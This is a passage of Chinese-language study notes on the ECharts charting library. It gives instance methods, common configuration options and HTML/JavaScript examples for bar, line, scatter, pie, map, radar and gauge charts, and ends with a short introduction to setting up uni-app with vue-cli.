         var mCharts = echarts.init(document.querySelector("div"), 'itcast')
         var xDataArr = ['张三', '李四', '王五', '闰土', '小明', '茅台', '二妞', '大强']
         var yDataArr = [88, 92, 63, 77, 94, 80, 72, 86]
         var option = {
           toolbox: {
             feature: {
               saveAsImage: {}
             }
           },
           xAxis: {
             type: 'category',
             data: xDataArr
           },
           yAxis: {
             type: 'value'
           },
           series: [
             {
               type: 'bar',
               data: yDataArr,
               markPoint: {
                 data: [
                   {
                     type: 'max', name: '最大值'
                   },
                   {
                     type: 'min', name: '最小值'
                   }
                 ]
               },
               markLine: {
                 data: [
                   {
                     type: 'average', name: '平均值'
                   }
                 ]
               },
               label: {
                 show: true,
                 rotate: 60
               },
               barWidth: '30%'
             }
           ]
         }
         mCharts.setOption(option)
         var mCharts2 = echarts.init(document.querySelector('#div1'))
         $.get('json/map/china.json', function(ret){
           echarts.registerMap('aa', ret)
           var option2 = {
             geo: {
               type: 'map',
               map: 'aa'
             }
           }
           mCharts2.setOption(option2)
           // echarts.connect([mCharts, mCharts2]) // 将柱状图和地图关联起来
         })
       </script>
     </body>
     </html>
```

### echartsInstance对象

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221140.png" alt="image-20201115145652990" style="zoom:67%;" />

- **setOption方法**

  设置或修改图表实例的配置项以及数据

  多次调用setOption方法

  ​	合并新的配置和旧的配置

  ​	增量动画

  ```
   mCharts.setOption(newoption)
  ```

- **resize方法**

  重新计算和绘制图表

  一般和window对象的resize事件结合使用

  ```
  // 监听window窗口大小变化的事件
      window.onresize = function(){
        // console.log('window.onresize...')
        // 调用echarts实例对象的resize方法
        mCharts.resize()
      }
  ```

- on\off方法

  <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221143.png" alt="image-20201114225604870" style="zoom:50%;" />

- **dispatchAction方法**

  触发某些行为

  使用代码模拟用户的行为

- **clear方法**

  清空当前实例，会移除实例中所有的组件和图表

  清空之后可以再次setOption

- **dispose方法**

  销毁实例

  实例：

  ```
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script src="lib/echarts.min.js"></script>
    <script src="lib/jquery.min.js"></script>
  </head>
  <body>
    <div style="width: 600px;height:400px"></div>
    <button id="btn1">触发行为</button>
    <button id="btn2">clear</button>
    <button id="btn3">setOption</button>
    <button id="btn4">dispose</button>
    <script>
      var mCharts = echarts.init(document.querySelector("div"))
      var pieData = [
        {
          value: 11231,
          name: "淘宝",
        },
        {
          value: 22673,
          name: "京东"
        },
        {
          value: 6123,
          name: "唯品会"
        },
        {
          value: 8989,
          name: "1号店"
        },
        {
          value: 6700,
          name: "聚美优品"
        }
      ]
      var option = {
        legend: {
          data: ['淘宝', '京东', '唯品会', '1号店', '聚美优品']
        },
        tooltip: {
          show: true
        },
        series: [
          {
            type: 'pie',
            data: pieData
          }
        ]
      }
      mCharts.setOption(option)
      mCharts.on('click', function (arg) {
        console.log(arg)
        console.log('click...')
      }) // 对事件进行监听
      mCharts.off('click') // 解绑click的事件
      //对点击legend进行监听
      mCharts.on('legendselectchanged', function (arg) {
        console.log(arg)
        console.log('legendselectchanged')
      })
      $('#btn1').click(function () {
        // 模拟用户的行为
        mCharts.dispatchAction({
          type: 'highlight',
          seriesIndex: 0, // 系列的索引
          dataIndex: 1 // 数据的索引
        })
        mCharts.dispatchAction({
          type: 'showTip',
          seriesIndex: 0,
          dataIndex: 2
        })
      })
      $('#btn2').click(function () {
        // 清空图表的实例
        mCharts.clear()
      })
      $('#btn3').click(function () {
        // 重新设置option
        mCharts.setOption(option)
      })
      $('#btn4').click(function () {
        // 销毁mCharts
        mCharts.dispose()
      })
    </script>
  </body>
  </html>
  ```

### 通用配置

> 通用配置指的就是任何图表都能使用的配置

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221146.png" alt="image-20201113223752590" style="zoom:67%;" />

#### 通用配置title

> 配置图的标题

- **文字样式**

  textStyle

- **标题边框**

  borderWidth、borderColor、borderRadius

- **标题位置**

  left、top、right、bottom

  实际代码：

  ```
       title: {
                 text: '成绩展示',
                 textStyle: {
                   color: 'red',
                 },
                 borderWidth: 5,
                 borderColor: 'blue',
                 borderRadius: 5,
                 left: 100,
                 top: 10,
               },
  ```

  效果：<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221150.png" alt="image-20201113224609443" style="zoom:80%;" />

#### 通用配置tooltip

> 提示框组件，用于配置鼠标滑过或点击图表时的显示框

- 触发类型：trigger

  item、axis

- 触发时机：triggerOn

  mouseover(默认)、click

- 格式化:formatter

  字符串模板、回调函数

  实际代码：

  ```
   tooltip: {
            // trigger: 'item',
            trigger: 'axis',
            triggerOn: 'click',
            // formatter:'{b}的成绩是{c}'
            formatter: function (arg) {
              console.log(arg)
              return arg[0].name + '的分数是：' + arg[0].data
            },
          },
  ```

  效果：

  ![image-20201113231408096](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221153.png)

#### 通用配置toolbox

> ECharts提供的工具栏

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221157.png" alt="image-20201113235400381" style="zoom:50%;" />

实例：

```
 toolbox: {
          feature: {
            saveAsImage: {}, //导出图片
            dataView: {}, //数据视图
            restore: {}, //重置
            dataZoom: {}, //区域缩放
            magicType: {
              type: ['bar', 'line'],
            },//动态图表类型的切换
          },
        },
```

效果：

![image-20201113235439804](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221203.png)

#### 通用配置legend

> 图例，用于筛选系列，需要和series配合使用

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221207.png" alt="image-20201114000553774" style="zoom: 50%;" />

实例：

```
  legend: {
          data: ['语文成绩', '数学成绩'],
          left:'5%',
          bottom: '5%',//位置控制
          orient:'vertical',//图例摆放方向
          itemWidth:30,//设置每个图例的宽度
          itemHeight:30,//设置每个图例的高度
           textStyle: {
              fontSize:16   //设置字体大小
           },
           itemGap:20,  //,每个图例之间的间隔大小
        },
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221212.png" alt="image-20201114000657550" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221219.png" alt="image-20201117225707704" style="zoom: 33%;" />

### 直角坐标系中的常用配置

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221224.png" alt="image-20201114123620196" style="zoom:50%;" />

- **网格grid**

  <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221228.png" alt="image-20201114123856154" style="zoom:50%;" />

  实例：

  ```
   grid: { // 坐标轴容器
          show: true, // 是否可见
          borderWidth: 10, // 边框的宽度
          borderColor: 'red', // 边框的颜色
          left: 120, // 边框的位置
          top: 120,
          width: 300, // 图的大小
          height: 150
        },
  ```

  效果：

  ![image-20201114123804928](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221232.png)

  

- **坐标轴axis**

- <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221235.png" alt="image-20201114125451089" style="zoom:50%;" />

- **区域缩放dataZoom**

   

  

### 柱状图（bar)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221238.png" alt="image-20201113223514597" style="zoom: 50%;" />

  <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221244.png" alt="image-20201113210741206" style="zoom: 50%;" />



使用实例：

```
    <!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="./lib/echarts.min.js"></script>
  </head>
  <body>
    <div style="width: 600px; height: 400px"></div>
    <script>
      var mCharts = echarts.init(document.querySelector('div'))
      var xDataArr = ['张三','李四','王五','闰土','小明','茅台','二妞','大强'] // 准备x轴数据
      var yDataArr = [88, 92, 63, 77, 94, 80, 72, 86] // 为x轴每一个元素指明数据
      var option = {
        xAxis: {
          type: 'category',
          data: xDataArr,
        },
        yAxis: {
          type: 'value',
        },
        series: [
          {
            name: '语文成绩',
            type: 'bar',
            //显示最大最小值
            markPoint: {
              data: [
                { type: 'max', name: '最大值' },
                { type: 'min', name: '最小值' },
              ],
            },
            //显示平均值
            markLine: {
              data: [
                {
                  type: 'average',
                  name: '平均值',
                },
              ],
            },
            //柱条数据设置
            label: {
              //是否显示数值
              show: true,
              //数值旋转角度
              rotate: 60,
              //显示位置，默认为inside，柱体中部
              position: 'inside',
            },
            //柱宽度设置
            barWidth:'30%',
            data: yDataArr,
          },
        ],
      }
      mCharts.setOption(option)
    </script>
  </body>
</html>
```

效果图：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221253.png" alt="image-20201113223231389" style="zoom:80%;" />

### 折线图 (line)

> 折线图常用来分析数据随时间的变化趋势

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221257.png" alt="image-20201114001346970" style="zoom: 50%;" />![image-20201114004335575](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505222114.png)

​			<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221304.png" alt="image-20201114112815077" style="zoom:50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
    <script src="./lib/echarts.min.js"></script>
  </head>
  <body>
    <div style="width: 600px; height: 400px"></div>
    <script>
      var mCharts = echarts.init(document.querySelector('div'))
      var xDataArr = ['1月','2月','3月','4月','5月','6月','7月','8月','9月','10月','11月','12月']
      var yDataArr = [3000,2800,900,1000,800,700,1400,1300,900,1000,800,600]
      var option = {
        xAxis: {
          type: 'category',
          data: xDataArr,
           boundaryGap: false, //数值位置
        },
        yAxis: {
          type: 'value',
          scale: true, //缩放
        },
        series: [
          {
            name: '康师傅销量',
            data: yDataArr,
            type: 'line',
            //最大值，最小值
            markPoint: {
              data: [
                {
                  type: 'max',
                },
                {
                  type: 'min',
                },
              ],
            },
            //平均值
            markLine: {
              data: [
                {
                  type: 'average',
                },
              ],
            },
            markArea: {
              data: [
                [{ xAxis: '1月' }, { xAxis: '2月' }],
                [{ xAxis: '5月' }, { xAxis: '8月' }],
              ],
            },
            smooth: true, //线条是否顺滑
            lineStyle: {
              color: 'green',
              type: 'dotted', //solid dotted  dashed
            }, //线条样式
            areaStyle: {
              color: 'pink',
            },
          },
        ],
      }
      mCharts.setOption(option)
    </script>
  </body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221308.png" alt="image-20201114004646489" style="zoom: 80%;" />



### 散点图(scatter)

> 散点图可以帮助我们推断出不同维度数据之间的相关性

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221312.png" alt="image-20201114121331575" style="zoom:50%;" />

​    <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221316.png" alt="image-20201114123052313" style="zoom: 50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>

<body>
  <div style="width: 600px;height:400px"></div>
  <script>
    //1. ECharts最基本的代码结构
    //2. x轴和y轴数据 二维数组 [ [身高,体重],...   ]
    //3. 将type的值设置为scatter, x轴和y轴的type都是value
         var data=[ { "gender": "male", "height": 171.4, "weight": 70 }, { "gender": "male", "height": 185.4, "weight": 81.8 }, { "gender": "male", "height": 185.4, "weight": 84.1 }, { "gender": "male", "height": 188, "weight": 90.5 }, { "gender": "male", "height": 188, "weight": 91.4 }, { "gender": "male", "height": 182.9, "weight": 89.1 }, { "gender": "male", "height": 176.5, "weight": 85 }, { "gender": "male", "height": 175.3, "weight": 69.1 }, { "gender": "male", "height": 175.3, "weight": 73.6 }, { "gender": "male", "height": 188, "weight": 80.5 }, { "gender": "male", "height": 188, "weight": 82.7 }, { "gender": "male", "height": 175.3, "weight": 86.4 }, { "gender": "male", "height": 170.5, "weight": 67.7 }, { "gender": "male", "height": 179.1, "weight": 92.7 }, { "gender": "male", "height": 177.8, "weight": 93.6 }, { "gender": "male", "height": 175.3, "weight": 70.9 }, { "gender": "male", "height": 182.9, "weight": 75 }, { "gender": "male", "height": 170.8, "weight": 93.2 }, { "gender": "male", "height": 188, "weight": 93.2 }, { "gender": "male", "height": 180.3, "weight": 77.7 }, { "gender": "male", "height": 177.8, "weight": 61.4 }, { "gender": "male", "height": 185.4, "weight": 94.1 }, { "gender": "male", "height": 168.9, "weight": 75 }, { "gender": "male", "height": 185.4, "weight": 83.6 }, { "gender": "male", "height": 180.3, "weight": 85.5 }, { "gender": "male", "height": 174, "weight": 73.9 }, { "gender": "male", "height": 167.6, "weight": 66.8 }, { "gender": "male", "height": 182.9, "weight": 87.3 }, { "gender": "male", "height": 160, "weight": 72.3 }, { "gender": "male", "height": 180.3, "weight": 88.6 }, { "gender": "male", "height": 167.6, "weight": 75.5 }, { "gender": "male", "height": 186.7, "weight": 101.4 }, { "gender": "male", "height": 175.3, "weight": 91.1 }, { "gender": "male", "height": 175.3, "weight": 67.3 }, { "gender": "male", "height": 175.9, "weight": 77.7 }, { "gender": "male", "height": 175.3, "weight": 81.8 }, { "gender": "male", "height": 179.1, "weight": 75.5 }, { "gender": "male", "height": 181.6, "weight": 84.5 }, { "gender": "male", "height": 177.8, "weight": 76.6 }, { "gender": "male", "height": 182.9, "weight": 85 }, { "gender": "male", "height": 177.8, "weight": 102.5 }, { "gender": "male", "height": 184.2, "weight": 77.3 }, { "gender": "male", "height": 179.1, "weight": 71.8 }, { "gender": "male", "height": 176.5, "weight": 87.9 }, { "gender": "male", "height": 188, "weight": 94.3 }, { "gender": "male", "height": 174, "weight": 70.9 }, { "gender": "male", "height": 167.6, "weight": 64.5 }, { "gender": "male", "height": 170.2, "weight": 77.3 }, { "gender": "male", "height": 167.6, "weight": 72.3 }, { "gender": "male", "height": 188, "weight": 87.3 }, { "gender": "male", "height": 174, "weight": 80 }, { "gender": "male", "height": 176.5, "weight": 82.3 }, { "gender": "male", "height": 180.3, "weight": 73.6 }, { "gender": "male", "height": 167.6, "weight": 74.1 }, { "gender": "male", "height": 188, "weight": 85.9 }, { "gender": "male", "height": 180.3, "weight": 73.2 }, { "gender": "male", "height": 167.6, "weight": 76.3 }, { "gender": "male", "height": 183, "weight": 65.9 }, { "gender": "male", "height": 183, "weight": 90.9 }, { "gender": "male", "height": 179.1, "weight": 89.1 }, { "gender": "male", "height": 170.2, "weight": 62.3 }, { "gender": "male", "height": 177.8, "weight": 82.7 }, { "gender": "male", "height": 179.1, "weight": 79.1 }, { "gender": "male", "height": 190.5, "weight": 98.2 }, { "gender": "male", "height": 177.8, "weight": 84.1 }, { "gender": "male", "height": 180.3, "weight": 83.2 }, { "gender": "male", "height": 180.3, "weight": 83.2 }]
    var axisData = []
    //处理数据
    for( var i=0;i<data.length;i++) {
      var height = data[i].height
      var weight = data[i].weight
      var newArr = [height, weight]
      axisData.push(newArr)
    }
    var mCharts = echarts.init(document.querySelector("div"))
    var option = {
      xAxis: {
        type: 'value',
        scale: true  //缩放
      },
      yAxis: {
        type: 'value',
        scale: true  //缩放
      },
      series: [
        {
          type: 'scatter', // 指明图表的类型为散点图
          data: axisData
        }
      ]
    }
    mCharts.setOption(option)
  </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221320.png" alt="image-20201114121331575" style="zoom:50%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221325.png" alt="image-20201114122720672" style="zoom:50%;" />

使用实例：

 series: [

​    {

​     // type: 'scatter',

​     type: 'effectScatter', // 指明图表为带涟漪动画的散点图

​     showEffectOn: 'emphasis', // 出现涟漪动画的时机 render emphasis

​     rippleEffect: {

​      scale: 10 // 涟漪动画时, 散点的缩放比例

​     },

​     data: axisData,

​     // symbolSize: 30

​     symbolSize: function (arg) { // 控制散点的大小

​      // console.log(arg)

​      var height = arg[0] / 100

​      var weight = arg[1]

​      // bmi = 体重kg / (身高m*身高m)  大于28,就代表肥胖

​      var bmi = weight / (height * height)

​      if (bmi > 28) {

​       return 20

​      }

​      return 5

​     },

​     itemStyle: { // 控制散点的样式

​      color: function (arg) {

​       // console.log(arg)

​       var height = arg.data[0] / 100

​       var weight = arg.data[1]

​       // bmi = 体重kg / (身高m*身高m)  大于28,就代表肥胖

​       var bmi = weight / (height * height)

​       if (bmi > 28) {

​        return 'red'

​       }

​       return 'green'

​      }

​     }

​    }

   ]

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221328.png" alt="image-20201114122822480" style="zoom:67%;" />

### 饼图(pie)

> 饼图可以很好地帮助用户快速了解不同分类地数据地占比情况

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221332.png" alt="image-20201114131131748" style="zoom:50%;" /> 

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221336.png" alt="image-20201114132957477" style="zoom:50%;" />

实例：

```
   <!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Document</title>
    <script src="lib/echarts.min.js"></script>
  </head>

  <body>
    <div style="width: 600px; height: 400px"></div>
    <script>
      //1. ECharts最基本的代码结构
      //2. 准备数据[{name:???, value:??? },{}]
      //   淘宝: 11231  京东: 22673  唯品会: 6123  1号店: 8989   聚美优品: 6700
      //3. 将type的值设置为pie
      var mCharts = echarts.init(document.querySelector('div'))
      // pieData就是需要设置给饼图的数据, 数组,数组中包含一个又一个的对象, 每一个对象中, 需要有name和value
      var pieData = [{ name: '淘宝',value: 11231,},{ name: '京东',value: 22673,},{name: '唯品会',value: 6123, },{name: '1号店',value: 8989,}]
      var option = {
        series: [
          {
            type: 'pie',
            data: pieData,
            label: {
              // 饼图文字的显示
              show: true, // 显示文字
              //formatter: 'hehe' // 决定文字显示的内容
              formatter: function (arg) {
                // console.log(arg)
                return (
                  arg.name + '平台' + arg.value + '元\n' + arg.percent + '%'
                )
              },
            },
            // radius: 20 // 饼图的半径
            // radius: '20%' // 百分比参照的是宽度和高度中较小的那一部分的一半来进行百分比设置
            // radius: ['50%', '75%'] // 第0个元素代表的是內圆的半径 第1个元素外圆的半径
            //roseType: 'radius', // 南丁格尔图 饼图的每一个区域的半径是不同的
             selectedMode: 'single' // 选中的效果,能够将选中的区域偏离圆点一小段距离
            //selectedMode: 'multiple',
            selectedOffset: 30,
          },
        ],
      }
      mCharts.setOption(option)
    </script>
  </body>
</html>

```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221341.png" alt="image-20201114132344688" style="zoom:67%;" />



### 地图(map)

> 地图主要可以帮助我们从宏观的角度快速看出不同地理位置上数据的差异

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221345.png" alt="image-20201114150727166" style="zoom:50%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221349.png" alt="image-20201114152233134" style="zoom:50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Document</title>
    <script src="lib/echarts.min.js"></script>
    <script src="lib/jquery.min.js"></script>
  </head>
  <body>
    <div style="width: 600px; height: 400px; border: 1px solid #f00"></div>

    <script>
      //1. ECharts最基本的代码结构
      //2. 准备中国地图的矢量数据
      //3. 使用Ajax获取矢量地图数据
      //4. 在Ajax的回调函数中注册地图矢量数据 echarts.registerMap('chinaMap', 矢量地图数据)
      //5. 配置geo的type为'map', map为'chinaMap'
      var mCharts = echarts.init(document.querySelector('div'))
      $.get('json/map/china.json', function (ret) {
        // ret 就是中国的各个省份的矢量地图数据
        echarts.registerMap('chinaMap', ret)
        var option = {
          geo: {
            type: 'map',
            map: 'chinaMap', // chinaMap需要和registerMap中的第一个参数保持一致
            roam: true, // 设置允许缩放以及拖动的效果
            label: {
              show: true, // 展示标签
            },
            zoom: 1, // 设置初始化的缩放比例
            // center: [87.617733, 43.792818] // 设置地图中心点的坐标
            top:'5%',
            bottom:'5%',
            itemStyle: {
              areaColor: '#2E72BF',//地图背景颜色
              borderColor:'#333'  //不同省份之间边界线的颜色
            }
          },
        }
        mCharts.setOption(option)
      })
    </script>
  </body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221352.png" alt="image-20201114150914138" style="zoom: 80%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221358.png" alt="image-20201114153807773" style="zoom:50%;" />

实例：

```
<script>
      //1. 显示基本的中国地图
      //2. 将空气质量的数据设置给series下的对象
      //3. 将series下的数据和geo关联起来
      //4. 配置visualMap
      var airData = [
        { name: '北京', value: 39.92 },
        { name: '天津', value: 39.13 },
        { name: '上海', value: 31.22 },
        { name: '重庆', value: 66 },
        { name: '河北', value: 147 },
        { name: '河南', value: 113 },
        { name: '云南', value: 25.04 },
        { name: '辽宁', value: 50 },
        { name: '黑龙江', value: 114 },
        { name: '湖南', value: 175 },
        { name: '安徽', value: 117 },
        { name: '山东', value: 92 },
        { name: '新疆', value: 84 },
        { name: '江苏', value: 67 },
        { name: '浙江', value: 84 },
        { name: '江西', value: 96 },
        { name: '湖北', value: 273 },
        { name: '广西', value: 59 },
        { name: '甘肃', value: 99 },
        { name: '山西', value: 39 },
        { name: '内蒙古', value: 58 },
        { name: '陕西', value: 61 },
        { name: '吉林', value: 51 },
        { name: '福建', value: 29 },
        { name: '贵州', value: 71 },
        { name: '广东', value: 38 },
        { name: '青海', value: 57 },
        { name: '西藏', value: 24 },
        { name: '四川', value: 58 },
        { name: '宁夏', value: 52 },
        { name: '海南', value: 54 },
        { name: '台湾', value: 88 },
        { name: '香港', value: 66 },
        { name: '澳门', value: 77 },
        { name: '南海诸岛', value: 55 },
      ]
      var mCharts = echarts.init(document.querySelector('div'))
      $.get('json/map/china.json', function (ret) {
        // ret 就是中国的各个省份的矢量地图数据
        echarts.registerMap('chinaMap', ret)
        var option = {
          geo: {
            type: 'map',
            map: 'chinaMap', // chinaMap需要和registerMap中的第一个参数保持一致
            roam: true, // 设置允许缩放以及拖动的效果
            label: {
              show: true, // 展示标签
            },
          },
          series: [
            {
              data: airData,
              geoIndex: 0, // 将空气质量的数据和第0个geo配置关联在一起
              type: 'map',
            },
          ],
          visualMap: {
            min: 0,
            max: 300,
            inRange: {
              color: ['yellow', 'red'], // 控制颜色渐变的范围
            },
            calculable: true, // 出现滑块
          },
        }
        mCharts.setOption(option)
      })
    </script>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221402.png" alt="image-20201114153937576" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221406.png" alt="image-20201114154212762" style="zoom:50%;" />

实例：

```
<body>
  <div style="width: 600px;height:400px;border: 1px solid #f00"></div>
  <script>
    //1. 给series下增加一个新的对象
    //2. 准备数据散点数据  , 配置给series下的另外一个对象
    //3. 配置series下的新对象的type值为effectScatter
    //4. 指明散点图的坐标系统为geo
    //5. 调整涟漪动画效果
    var airData = [
      { name: '北京', value: 39.92 },
      { name: '天津', value: 39.13 },
      { name: '上海', value: 31.22 },
      { name: '重庆', value: 66 },
      { name: '河北', value: 147 },
      { name: '河南', value: 113 },
      { name: '云南', value: 25.04 },
      { name: '辽宁', value: 50 },
      { name: '黑龙江', value: 114 },
      { name: '湖南', value: 175 },
      { name: '安徽', value: 117 },
      { name: '山东', value: 92 },
      { name: '新疆', value: 84 },
      { name: '江苏', value: 67 },
      { name: '浙江', value: 84 },
      { name: '江西', value: 96 },
      { name: '湖北', value: 273 },
      { name: '广西', value: 59 },
      { name: '甘肃', value: 99 },
      { name: '山西', value: 39 },
      { name: '内蒙古', value: 58 },
      { name: '陕西', value: 61 },
      { name: '吉林', value: 51 },
      { name: '福建', value: 29 },
      { name: '贵州', value: 71 },
      { name: '广东', value: 38 },
      { name: '青海', value: 57 },
      { name: '西藏', value: 24 },
      { name: '四川', value: 58 },
      { name: '宁夏', value: 52 },
      { name: '海南', value: 54 },
      { name: '台湾', value: 88 },
      { name: '香港', value: 66 },
      { name: '澳门', value: 77 },
      { name: '南海诸岛', value: 55 }
    ]
    var scatterData = [
      {
        value: [117.283042, 31.86119]
      }
    ]
    var mCharts = echarts.init(document.querySelector("div"))
    $.get('json/map/china.json', function (ret) {
      // ret 就是中国的各个省份的矢量地图数据
      console.log(ret)
      echarts.registerMap('chinaMap', ret)
      var option = {
        geo: {
          type: 'map',
          map: 'chinaMap', // chinaMap需要和registerMap中的第一个参数保持一致
          roam: true, // 设置允许缩放以及拖动的效果
          label: {
            show: true // 展示标签
          }
        },
        series: [
          {
            data: airData,
            geoIndex: 0, // 将空气质量的数据和第0个geo配置关联在一起
            type: 'map'
          },
          {
            data: scatterData, // 配置散点的坐标数据
            type: 'effectScatter',
            coordinateSystem: 'geo', // 指明散点使用的坐标系统  geo的坐标系统
            rippleEffect: {
              scale: 10 ,// 设置涟漪动画的缩放比例
              brushType:'stroke'//设置涟漪动画的样式
            }
          }
        ],
        visualMap: {
          min: 0,
          max: 300,
          inRange: {
            color: ['white', 'red'] // 控制颜色渐变的范围
          },
          calculable: true // 出现滑块
        }
      }
      mCharts.setOption(option)
    })
  </script>
</body>

```

### 雷达图(ladar)

> 雷达图可以用来分析多个维度的数据与标准数据的对比情况

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221410.png" alt="image-20201114155417444" style="zoom:50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>

<body>
  <div style="width: 600px;height:400px"></div>
  <script>
    //1. ECharts最基本的代码结构
    //2. 定义各个维度的最大值, 通过radar属性配置
    //   易用性,功能,拍照,跑分,续航, 每个维度的最大值都是100
    //3. 准备产品数据, 设置给series下的data
    //   华为手机1: 80, 90, 80, 82, 90
    //   中兴手机1: 70, 82, 75, 70, 78
    //4. 将type的值设置为radar
    var mCharts = echarts.init(document.querySelector("div"))
    // 各个维度的最大值
    var dataMax = [{name: '易用性',max: 100},{name: '功能',max: 100},{name: '拍照',max: 100},{name: '跑分',max: 100},{name: '续航',max: 100}]
    var option = {
      radar: { 
        indicator: dataMax, // 配置各个维度的最大值
        shape: 'polygon' // 配置雷达图最外层的图形 circle polygon
      },
      series: [
        {
          type: 'radar', // radar 此图表时一个雷达图
          label: { // 设置标签的样式
            show: true // 显示数值
          },
          areaStyle: {}, // 将每一个产品的雷达图形成阴影的面积
          data: [
            {
              name: '华为手机1',
              value: [80, 90, 80, 82, 90]
            },
            {
              name: '中兴手机1',
              value: [70, 82, 75, 70, 78]
            }
          ]
        }
      ]
    }
    mCharts.setOption(option)
  </script>
</body>
</html>
```

### 仪表盘图(gaupe)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221414.png" alt="image-20201114160237761" style="zoom:50%;" />

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="lib/echarts.min.js"></script>
</head>
<body>
  <div style="width: 600px;height:400px"></div>
  <script>
    //1. ECharts最基本的代码结构
    //2. 准备数据, 设置给series下的data
    //3. 将type的值设置为gauge
    var mCharts = echarts.init(document.querySelector("div"))
    var option = {
      series: [
        {
          type: 'gauge',
          data: [
            {
              value: 97,
              itemStyle: { // 指针的样式
                color: 'pink' // 指针的颜色
              }
            }, // 每一个对象就代表一个指针
            {
              value: 85,
              itemStyle: {
                color: 'green'
              }
            }
          ],
          min: 50 // min max 控制仪表盘数值范围
        }
      ]
    }
    mCharts.setOption(option)
  </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221418.png" alt="image-20201114160458791" style="zoom:67%;" />



# uni-app

## 简介

> `uni-app` 是一个使用 [Vue.js](https://vuejs.org/) 开发所有前端应用的框架，开发者编写一套代码，可发布到iOS、Android、Web（响应式）、以及各种小程序（微信/支付宝/百度/头条/QQ/钉钉/淘宝）、快应用等多个平台。



<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210530112846.png" alt="image-20210530112846377" style="zoom: 67%;" />

### 搭建开发环境

#### 1、通过HBuilder X可视化界面

详情请访问：https://uniapp.dcloud.io/quickstart-hx

#### 2、通过vue-cli命令行

> 除了HBuilderX可视化界面，也可以使用 `cli` 脚手架，可以通过 `vue-cli` 创建 `uni-app` 项目。这样我们就可以使用任何编辑器开发了
>
> 比如vscode

[环境安装](https://uniapp.dcloud.io/quickstart-cli?id=环境安装)

全局安装vue-cli

```
	npm install -g @vue/cli
```

[创建uni-app](https://uniapp.dcloud.io/quickstart-cli?id=创建uni-app)

**使用正式版**（对应HBuilderX最新正式版）

```
	vue create -p dcloudio/uni-preset-vue my-project
```

**使用alpha版**（对应HBuilderX最新alpha版）

```
	vue create -p dcloudio/uni-preset-vue#alpha my-alpha-project
```

此时，会提示选择项目模板，初次体验建议选择 `hello uni-app` 项目模板，如下所示：

